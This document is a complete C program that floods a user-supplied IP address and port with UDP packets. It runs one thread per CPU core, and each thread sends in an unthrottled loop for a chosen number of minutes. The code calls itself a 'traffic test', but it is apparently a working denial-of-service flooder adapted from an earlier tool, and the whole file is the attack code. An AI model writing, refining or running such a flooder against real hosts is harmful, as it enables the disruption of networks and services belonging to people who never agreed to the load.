#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <sys/sysinfo.h>  // For getting the number of CPU cores

// Global variables for IP, port, and duration
char* ip;
int port;
int duration;  // Duration in seconds (after conversion from minutes)

// Function to send UDP traffic (no changes in content or message size)
void send_udp_traffic(void* arg1) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(fd);
        pthread_exit(NULL);
    }

    char message[0x200];  // Packet size as per the original
    snprintf(message, sizeof(message), "UDP traffic test");  // Keep message content the same

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        if (sendto(fd, message, strlen(message), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("Send failed");
            close(fd);
            pthread_exit(NULL);
        }
    }

    close(fd);
    pthread_exit(NULL);
}

// Main function (now takes IP, PORT, and DURATION in minutes)
int main(int argc, char** argv) {
    if (argc != 4) {  // Expect 3 arguments (IP, PORT, DURATION in minutes)
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION in minutes>\n", argv[0]);
        exit(1);
    }

    // Assign the arguments
    ip = argv[1];
    port = atoi(argv[2]);
    int duration_in_minutes = atoi(argv[3]);

    // Convert duration from minutes to seconds
    duration = duration_in_minutes * 60;

    // Automatically set threads based on the number of CPU cores
    int threads = get_nprocs();  // Number of CPU cores

    pthread_t thread[threads];

    // Create threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Join threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread[i], NULL);
    }

    return 0;
}
